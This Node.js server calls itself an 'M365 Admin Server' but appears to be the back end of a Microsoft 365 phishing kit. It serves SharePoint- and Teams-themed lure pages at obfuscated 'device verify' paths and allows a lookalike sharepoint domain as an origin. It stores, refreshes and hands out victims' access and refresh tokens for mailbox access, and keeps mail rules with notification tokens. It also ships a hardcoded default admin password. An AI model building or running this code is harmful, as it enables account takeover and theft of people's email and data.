#!/usr/bin/env node  
// ╔══════════════════════════════════════════════════════════════════╗
// ║  M365 Admin Server                                               ║
// ║  Manages admin accounts + per-admin M365 token storage           ║
// ║  Uses better-sqlite3 (sync, zero-config, single file DB)         ║
// ║  Runs on http://localhost:3738                                   ║
// ╚══════════════════════════════════════════════════════════════════╝

const http    = require('http');
const https   = require('https');
const crypto  = require('crypto');
const fs      = require('fs');
const path    = require('path');

const PORT          = process.argv.includes('--port')
  ? parseInt(process.argv[process.argv.indexOf('--port') + 1], 10) : 3738;
const REFRESHER_URL = process.env.REFRESHER_URL || 'http://refresh-srv:3737/refresh';
const DB_PATH       = path.resolve(process.cwd(), 'data', 'admin.db');
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
const SESSION_TTL_MS = 8 * 60 * 60 * 1000;
const COOKIE_NAME    = 'm365_admin_sid';

const ALLOWED_ORIGINS = new Set([
  'https://uhp.sharepoint03420032.cloud',
  `http://127.0.0.1:${PORT}`,
  `http://localhost:${PORT}`,
]);

let Database;
try { Database = require('better-sqlite3'); }
catch { console.error('\n❌  better-sqlite3 not found.\n   Run:  npm install better-sqlite3\n'); process.exit(1); }

// ── Database setup ────────────────────────────────────────────────────────────
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`
  CREATE TABLE IF NOT EXISTS admins (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    username   TEXT    NOT NULL UNIQUE,
    pass_hash  TEXT    NOT NULL,
    pass_salt  TEXT    NOT NULL,
    created_at TEXT    NOT NULL DEFAULT (datetime('now'))
  );
  CREATE TABLE IF NOT EXISTS sessions (
    id         TEXT    PRIMARY KEY,
    admin_id   INTEGER NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
    created_at TEXT    NOT NULL DEFAULT (datetime('now')),
    expires_at TEXT    NOT NULL
  );
  CREATE TABLE IF NOT EXISTS m365_tokens (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id        INTEGER NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
    label           TEXT,
    email           TEXT,
    name            TEXT,
    access_token    TEXT    NOT NULL,
    refresh_token   TEXT,
    expires_at      TEXT,
    token_file_name TEXT,
    token_file_path TEXT,
    raw_json        TEXT,
    added_at        TEXT    NOT NULL DEFAULT (datetime('now')),
    refreshed_at    TEXT
  );
  CREATE TABLE IF NOT EXISTS graph_rules (
    id             INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id       INTEGER NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
    rule_id        TEXT    NOT NULL,
    name           TEXT    NOT NULL,
    enabled        INTEGER NOT NULL DEFAULT 1,
    condition_mode TEXT    NOT NULL DEFAULT 'all',
    conditions     TEXT    NOT NULL DEFAULT '[]',
    actions        TEXT    NOT NULL DEFAULT '[]',
    run_on         TEXT    NOT NULL DEFAULT 'incoming',
    watch_folders  TEXT    NOT NULL DEFAULT '[]',
    match_count    INTEGER NOT NULL DEFAULT 0,
    last_run       TEXT,
    created_at     TEXT    NOT NULL DEFAULT (datetime('now')),
    updated_at     TEXT    NOT NULL DEFAULT (datetime('now')),
    notify         INTEGER NOT NULL DEFAULT 0,
    notify_token   TEXT,
    notify_chat    TEXT,
    notify_template TEXT,
    UNIQUE(admin_id, rule_id)
  );
`);

// Migrations for existing DBs
try { db.prepare('ALTER TABLE m365_tokens ADD COLUMN token_file_path TEXT').run(); } catch {}
try { db.prepare("ALTER TABLE graph_rules ADD COLUMN watch_folders TEXT NOT NULL DEFAULT '[]'").run(); } catch {}
try { db.prepare('ALTER TABLE graph_rules ADD COLUMN notify INTEGER NOT NULL DEFAULT 0').run(); } catch {}
try { db.prepare('ALTER TABLE graph_rules ADD COLUMN notify_token TEXT').run(); } catch {}
try { db.prepare('ALTER TABLE graph_rules ADD COLUMN notify_chat TEXT').run(); } catch {}
try { db.prepare('ALTER TABLE graph_rules ADD COLUMN notify_template TEXT').run(); } catch {}

const adminCount = db.prepare('SELECT COUNT(*) as c FROM admins').get().c;
if (adminCount === 0) {
  const { hash, salt } = hashPassword('admin1234@');
  db.prepare('INSERT INTO admins (username, pass_hash, pass_salt) VALUES (?, ?, ?)').run('admin', hash, salt);
  console.log('\n  ✓ Default admin created: admin / admin1234@\n  ⚠  Change password after first login!\n');
}

// ── Crypto ────────────────────────────────────────────────────────────────────
function hashPassword(password, saltHex) {
  const salt = saltHex || crypto.randomBytes(16).toString('hex');
  const hash = crypto.pbkdf2Sync(password, salt, 100_000, 64, 'sha512').toString('hex');
  return { hash, salt };
}
function verifyPassword(password, hash, salt) {
  const { hash: h } = hashPassword(password, salt);
  return crypto.timingSafeEqual(Buffer.from(h, 'hex'), Buffer.from(hash, 'hex'));
}
function newSessionId() { return crypto.randomBytes(32).toString('hex'); }

// ── Sessions ──────────────────────────────────────────────────────────────────
const sessions = new Map();
db.prepare("DELETE FROM sessions WHERE expires_at < datetime('now')").run();
for (const row of db.prepare('SELECT * FROM sessions').all()) {
  sessions.set(row.id, { adminId: row.admin_id, expiresAt: new Date(row.expires_at + 'Z').getTime() });
}
function createSession(adminId) {
  const sid = newSessionId(), expiresAt = new Date(Date.now() + SESSION_TTL_MS);
  db.prepare('INSERT INTO sessions (id, admin_id, expires_at) VALUES (?, ?, ?)').run(sid, adminId, expiresAt.toISOString().replace('T',' ').slice(0,19));
  sessions.set(sid, { adminId, expiresAt: expiresAt.getTime() });
  return sid;
}
function destroySession(sid) { db.prepare('DELETE FROM sessions WHERE id = ?').run(sid); sessions.delete(sid); }
function getSession(sid) {
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  if (Date.now() > s.expiresAt) { destroySession(sid); return null; }
  return s;
}

// ── Cookie / CORS / Auth helpers ──────────────────────────────────────────────
function parseCookies(h) {
  const out = {}; if (!h) return out;
  for (const p of h.split(';')) { const [k,...v] = p.trim().split('='); if (k) out[k.trim()] = decodeURIComponent(v.join('=').trim()); }
  return out;
}
function setCookieHeader(sid, maxAgeSec) { return `${COOKIE_NAME}=${sid}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAgeSec}; Secure`; }
function getCorsHeaders(req) {
  const origin = req.headers.origin || '';
  const allowed = ALLOWED_ORIGINS.has(origin) ? origin : '';
  return { 'Access-Control-Allow-Origin': allowed, 'Access-Control-Allow-Credentials': 'true',
           'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
           'Access-Control-Allow-Headers': 'Content-Type', 'Vary': 'Origin' };
}
function requireAuth(req) {
  const sid = parseCookies(req.headers.cookie)[COOKIE_NAME], session = getSession(sid);
  if (!session) return null;
  return db.prepare('SELECT id, username, created_at FROM admins WHERE id = ?').get(session.adminId) || null;
}
function decodeJwt(t) { try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString()); } catch { return null; } }

function httpPost(url, bodyObj) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(bodyObj), u = new URL(url), lib = u.protocol === 'https:' ? https : http;
    const req = lib.request({ hostname: u.hostname, port: u.port||(u.protocol==='https:'?443:80), path: u.pathname, method: 'POST',
      headers: { 'Content-Type':'application/json', 'Content-Length': Buffer.byteLength(body) } },
      res => { let raw=''; res.on('data',c=>raw+=c); res.on('end',()=>{ try{resolve({status:res.statusCode,body:JSON.parse(raw)});}catch{reject(new Error('Bad JSON'))}; }); });
    req.on('error', reject); req.write(body); req.end();
  });
}

function send(res, status, obj, extraHeaders={}, req=null) {
  const cors = req ? getCorsHeaders(req) : {}, body = JSON.stringify(obj);
  res.writeHead(status, { ...cors, 'Content-Type':'application/json', 'Content-Length':Buffer.byteLength(body), ...extraHeaders });
  res.end(body);
}
async function readBody(req) { let raw=''; for await (const c of req) raw+=c; try{return JSON.parse(raw);}catch{return {};} }

// ── Token handlers ────────────────────────────────────────────────────────────
async function handleLogin(req, res) {
  const { username, password } = await readBody(req);
  if (!username || !password) return send(res, 400, { error: 'username and password required' }, {}, req);
  const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username.trim().toLowerCase());
  if (!admin) return send(res, 401, { error: 'Invalid credentials' }, {}, req);
  let valid = false; try { valid = verifyPassword(password, admin.pass_hash, admin.pass_salt); } catch {}
  if (!valid) return send(res, 401, { error: 'Invalid credentials' }, {}, req);
  const sid = createSession(admin.id);
  send(res, 200, { ok:true, admin:{id:admin.id, username:admin.username} }, { 'Set-Cookie': setCookieHeader(sid, Math.floor(SESSION_TTL_MS/1000)) }, req);
}
function handleLogout(req, res) {
  const sid = parseCookies(req.headers.cookie)[COOKIE_NAME]; if (sid) destroySession(sid);
  send(res, 200, { ok:true }, { 'Set-Cookie': setCookieHeader('', 0) }, req);
}
function handleMe(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  send(res, 200, { admin }, {}, req);
}
function handleGetTokens(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const rows = db.prepare(`SELECT id,label,email,name,expires_at,token_file_name,token_file_path,added_at,refreshed_at,
    CASE WHEN refresh_token IS NOT NULL AND refresh_token != '' THEN 1 ELSE 0 END as has_refresh_token,
    substr(access_token,1,20) as token_preview FROM m365_tokens WHERE admin_id=? ORDER BY added_at DESC`).all(admin.id);
  send(res, 200, { tokens: rows }, {}, req);
}
function handleGetTokensForMail(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const rows = db.prepare(`SELECT id,label,email,name,access_token,refresh_token,expires_at,token_file_name,token_file_path,raw_json FROM m365_tokens WHERE admin_id=? ORDER BY added_at DESC`).all(admin.id);
  send(res, 200, { tokens: rows.map(r=>({ vault_id:r.id, label:r.label, email:r.email, name:r.name, access_token:r.access_token, refresh_token:r.refresh_token, expires_at:r.expires_at, token_file_name:r.token_file_name, token_file_path:r.token_file_path })) }, {}, req);
}
async function handleAddToken(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const body = await readBody(req); const { raw_json, label, token_file_path: filePath } = body;
  if (!raw_json) return send(res, 400, { error:'raw_json is required' }, {}, req);
  let tokenData; try { tokenData = typeof raw_json==='string'?JSON.parse(raw_json):raw_json; } catch { return send(res, 400, { error:'raw_json must be valid JSON' }, {}, req); }
  const at = tokenData.access_token, rt = tokenData.refresh_token||null;
  if (!at) return send(res, 400, { error:'No access_token in token data' }, {}, req);
  const decoded = decodeJwt(at), email = tokenData.email||decoded?.upn||decoded?.unique_name||'', name = tokenData.name||decoded?.name||'';
  const expiresAt = tokenData.expires_at||(tokenData.expires_in?new Date(Date.now()+tokenData.expires_in*1000).toISOString():null);
  const resolvedFilePath = filePath||tokenData.token_file_path||null, resolvedFileName = resolvedFilePath?path.basename(resolvedFilePath):(tokenData.token_file||null);
  const result = db.prepare(`INSERT INTO m365_tokens (admin_id,label,email,name,access_token,refresh_token,expires_at,token_file_name,token_file_path,raw_json) VALUES (?,?,?,?,?,?,?,?,?,?)`).run(admin.id, label||email||'Token '+new Date().toLocaleString(), email, name, at, rt, expiresAt, resolvedFileName, resolvedFilePath, JSON.stringify(tokenData));
  send(res, 201, { ok:true, id:result.lastInsertRowid, email, name, expires_at:expiresAt }, {}, req);
}
function handleDeleteToken(req, res, id) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const row = db.prepare('SELECT id FROM m365_tokens WHERE id=? AND admin_id=?').get(id, admin.id);
  if (!row) return send(res, 404, { error:'Token not found' }, {}, req);
  db.prepare('DELETE FROM m365_tokens WHERE id=?').run(id);
  send(res, 200, { ok:true }, {}, req);
}
async function handleRefreshToken(req, res, id) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const row = db.prepare('SELECT * FROM m365_tokens WHERE id=? AND admin_id=?').get(id, admin.id);
  if (!row) return send(res, 404, { error:'Token not found' }, {}, req);
  if (!row.refresh_token) return send(res, 400, { error:'No refresh_token stored' }, {}, req);
  let rawObj={}; try{rawObj=JSON.parse(row.raw_json||'{}');}catch{}
  const tokenData = {...rawObj, access_token:row.access_token, refresh_token:row.refresh_token, expires_at:row.expires_at};
  const refreshBody = row.token_file_path&&fs.existsSync(row.token_file_path) ? {tokenFilePath:row.token_file_path} : {tokenData};
  let freshData;
  try { const resp = await httpPost(REFRESHER_URL, refreshBody); if (resp.status!==200||resp.body.error) throw new Error(resp.body.error||`Status ${resp.status}`); freshData=resp.body; }
  catch(e) { return send(res, 502, { error:'Refresh failed: '+e.message }, {}, req); }
  db.prepare(`UPDATE m365_tokens SET access_token=?,refresh_token=?,expires_at=?,refreshed_at=datetime('now'),email=COALESCE(?,email),name=COALESCE(?,name),raw_json=? WHERE id=?`).run(freshData.access_token, freshData.refresh_token||row.refresh_token, freshData.expires_at, freshData.email||null, freshData.name||null, JSON.stringify(freshData), id);
  send(res, 200, { ok:true, expires_at:freshData.expires_at, email:freshData.email||row.email, name:freshData.name||row.name, file_saved:!!(row.token_file_path&&freshData.refreshed), file_path:row.token_file_path||null }, {}, req);
}
function handleGetFullToken(req, res, id) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const row = db.prepare('SELECT * FROM m365_tokens WHERE id=? AND admin_id=?').get(id, admin.id);
  if (!row) return send(res, 404, { error:'Token not found' }, {}, req);
  let rawObj={}; try{rawObj=JSON.parse(row.raw_json||'{}');}catch{}
  send(res, 200, { token:{...rawObj, access_token:row.access_token, refresh_token:row.refresh_token, expires_at:row.expires_at, email:row.email, name:row.name} }, {}, req);
}
async function handleCreateAdmin(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const { username, password } = await readBody(req);
  if (!username||!password) return send(res, 400, { error:'username and password required' }, {}, req);
  if (password.length<8) return send(res, 400, { error:'Password must be at least 8 characters' }, {}, req);
  const exists = db.prepare('SELECT id FROM admins WHERE username=?').get(username.trim().toLowerCase());
  if (exists) return send(res, 409, { error:'Username already taken' }, {}, req);
  const { hash, salt } = hashPassword(password);
  const result = db.prepare('INSERT INTO admins (username,pass_hash,pass_salt) VALUES (?,?,?)').run(username.trim().toLowerCase(), hash, salt);
  send(res, 201, { ok:true, id:result.lastInsertRowid, username:username.trim().toLowerCase() }, {}, req);
}
function handleListAdmins(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  send(res, 200, { admins: db.prepare('SELECT id,username,created_at FROM admins ORDER BY id').all() }, {}, req);
}
async function handleChangePassword(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const { current_password, new_password } = await readBody(req);
  if (!current_password||!new_password) return send(res, 400, { error:'current_password and new_password required' }, {}, req);
  if (new_password.length<8) return send(res, 400, { error:'Password must be at least 8 characters' }, {}, req);
  const full = db.prepare('SELECT * FROM admins WHERE id=?').get(admin.id);
  let valid=false; try{valid=verifyPassword(current_password,full.pass_hash,full.pass_salt);}catch{}
  if (!valid) return send(res, 401, { error:'Current password is incorrect' }, {}, req);
  const { hash, salt } = hashPassword(new_password);
  db.prepare('UPDATE admins SET pass_hash=?,pass_salt=? WHERE id=?').run(hash, salt, admin.id);
  send(res, 200, { ok:true }, {}, req);
}

// ── Graph Rules handlers ──────────────────────────────────────────────────────
function handleGetRules(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const rows = db.prepare(`
    SELECT id,rule_id,name,enabled,condition_mode,conditions,actions,
           run_on,watch_folders,match_count,last_run,created_at,updated_at
    FROM graph_rules WHERE admin_id=? ORDER BY id ASC
  `).all(admin.id);
  send(res, 200, { rules: rows.map(r=>({...r, enabled:!!r.enabled, conditions:JSON.parse(r.conditions||'[]'), actions:JSON.parse(r.actions||'[]'), watchFolders:JSON.parse(r.watch_folders||'[]')})) }, {}, req);
}
async function handleUpsertRules(req, res) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const body = await readBody(req);
  const rules = Array.isArray(body) ? body : (body.rules || []);
  if (!rules.length) return send(res, 400, { error:'rules array required' }, {}, req);
  const upsert = db.prepare(`INSERT INTO graph_rules (admin_id,rule_id,name,enabled,condition_mode,conditions,actions,run_on,watch_folders,match_count,last_run,updated_at,notify,notify_token,notify_chat,notify_template)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,datetime('now'),?,?,?,?)
    ON CONFLICT(admin_id,rule_id) DO UPDATE SET name=excluded.name,enabled=excluded.enabled,condition_mode=excluded.condition_mode,
      conditions=excluded.conditions,actions=excluded.actions,run_on=excluded.run_on,watch_folders=excluded.watch_folders,
      match_count=excluded.match_count,last_run=excluded.last_run,updated_at=datetime('now'),
      notify=excluded.notify,notify_token=excluded.notify_token,notify_chat=excluded.notify_chat,notify_template=excluded.notify_template`);
  db.transaction(list => { for (const r of list) upsert.run(r); })(rules.map(r=>[admin.id, r.id||r.rule_id, r.name, r.enabled===false?0:1, r.conditionMode||r.condition_mode||'all', JSON.stringify(r.conditions||[]), JSON.stringify(r.actions||[]), r.runOn||r.run_on||'incoming', JSON.stringify(r.watchFolders||r.watch_folders||[]), r.matchCount||r.match_count||0, r.lastRun||r.last_run||null]));
  send(res, 200, { ok:true, saved:rules.length }, {}, req);
}
function handleDeleteRule(req, res, ruleId) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  db.prepare('DELETE FROM graph_rules WHERE admin_id=? AND rule_id=?').run(admin.id, ruleId);
  send(res, 200, { ok:true }, {}, req);
}
async function handleRuleStats(req, res, ruleId) {
  const admin = requireAuth(req); if (!admin) return send(res, 401, { error:'Not authenticated' }, {}, req);
  const { match_count, last_run } = await readBody(req);
  db.prepare(`UPDATE graph_rules SET match_count=?,last_run=?,updated_at=datetime('now') WHERE admin_id=? AND rule_id=?`).run(match_count, last_run, admin.id, ruleId);
  send(res, 200, { ok:true }, {}, req);
}
// Internal: used by daemon reading directly from DB (no HTTP auth needed)
// Returns all enabled rules for a given admin email
function getRulesForEmail(email) {
  const admin = db.prepare('SELECT id FROM admins WHERE username=? OR (SELECT email FROM m365_tokens WHERE admin_id=admins.id AND email=? LIMIT 1) IS NOT NULL').get(email, email);
  if (!admin) return [];
  const rows = db.prepare('SELECT * FROM graph_rules WHERE admin_id=? AND enabled=1 ORDER BY id ASC').all(admin.id);
  return rows.map(r=>({...r, enabled:true, conditions:JSON.parse(r.conditions||'[]'), actions:JSON.parse(r.actions||'[]')}));
}

// ── HTML helper ───────────────────────────────────────────────────────────────
function serveHtml(res, filename) {
  const htmlPath = path.join(__dirname, filename);
  if (fs.existsSync(htmlPath)) { const c=fs.readFileSync(htmlPath); res.writeHead(200,{'Content-Type':'text/html; charset=utf-8','Content-Length':c.length}); res.end(c); }
  else { res.writeHead(404,{'Content-Type':'text/plain'}); res.end(`${filename} not found`); }
}

// ── Router ────────────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const method = req.method.toUpperCase();
  const url    = req.url.split('?')[0].replace(/\/$/, '') || '/';
  if (method === 'OPTIONS') { res.writeHead(204, { ...getCorsHeaders(req), 'Content-Length':'0' }); res.end(); return; }
  console.log(`[${new Date().toISOString()}] ${method} ${url}`);

  if (method==='GET' && url==='/admin')    return serveHtml(res, 'admin.html');
  if (method==='GET' && url==='/onedrive') return serveHtml(res, 'onedrive.html');
  const decodedUrl = decodeURIComponent(url);
  if (decodedUrl==='/microsoft-device%verify%file%access%azure%authentication') return serveHtml(res,'sharepoint.html');
  if (decodedUrl==='/microsoft-teams%verify%invite%access%device%authentication') return serveHtml(res,'teams.html');
  if (method==='GET' && (url==='/mail'||url==='/localmail.html')) {
    const sid=parseCookies(req.headers.cookie)[COOKIE_NAME], session=getSession(sid);
    if (!session) { res.writeHead(302,{'Location':'/admin'}); res.end(); return; }
    return serveHtml(res,'localmail.html');
  }
  if (method==='GET' && url==='/admin-health') return send(res, 200, { status:'ok', server:'M365 Admin', port:PORT, time:new Date().toISOString() }, {}, req);

  // Token routes
  if (method==='POST' && url==='/api/login')           return handleLogin(req, res);
  if (method==='POST' && url==='/api/logout')          return handleLogout(req, res);
  if (method==='GET'  && url==='/api/me')              return handleMe(req, res);
  if (method==='GET'  && url==='/api/tokens')          return handleGetTokens(req, res);
  if (method==='GET'  && url==='/api/tokens/for-mail') return handleGetTokensForMail(req, res);
  if (method==='POST' && url==='/api/tokens')          return handleAddToken(req, res);
  if (method==='GET'  && url==='/api/admins')          return handleListAdmins(req, res);
  if (method==='POST' && url==='/api/admins')          return handleCreateAdmin(req, res);
  if (method==='PUT'  && url==='/api/admins/password') return handleChangePassword(req, res);
  const tokenMatch = url.match(/^\/api\/tokens\/(\d+)$/);
  if (tokenMatch) {
    const id = parseInt(tokenMatch[1],10);
    if (method==='DELETE') return handleDeleteToken(req, res, id);
    if (method==='GET')    return handleGetFullToken(req, res, id);
  }
  const refreshMatch = url.match(/^\/api\/tokens\/(\d+)\/refresh$/);
  if (refreshMatch && method==='POST') return handleRefreshToken(req, res, parseInt(refreshMatch[1],10));

  // Graph Rules routes
  if (method==='GET'  && url==='/api/rules') return handleGetRules(req, res);
  if (method==='POST' && url==='/api/rules') return handleUpsertRules(req, res);
  const ruleMatch = url.match(/^\/api\/rules\/([^\/]+)$/);
  if (ruleMatch) {
    if (method==='DELETE') return handleDeleteRule(req, res, ruleMatch[1]);
  }
  const ruleStatsMatch = url.match(/^\/api\/rules\/([^\/]+)\/stats$/);
  if (ruleStatsMatch && method==='PATCH') return handleRuleStats(req, res, ruleStatsMatch[1]);

  send(res, 404, { error:`Unknown route: ${method} ${url}` }, {}, req);
});

server.listen(PORT, process.env.HOST||'0.0.0.0', () => {
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  M365 Admin Server  ✓ Running                               ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log(`║  http://127.0.0.1:${String(PORT).padEnd(42)}║`);
  console.log('║  /admin → Admin portal   /mail → Mail client                ║');
  console.log('║  /api/rules → Graph Rules CRUD                               ║');
  console.log(`║  Database: ${path.basename(DB_PATH).padEnd(50)}║`);
  console.log('╚══════════════════════════════════════════════════════════════╝\n');
});
server.on('error', e => { if(e.code==='EADDRINUSE') console.error(`\n❌  Port ${PORT} in use.\n`); else console.error('\n❌  Server error:',e.message); process.exit(1); });
process.on('SIGINT',  ()=>{ db.close(); server.close(()=>process.exit(0)); });
process.on('SIGTERM', ()=>{ db.close(); server.close(()=>process.exit(0)); });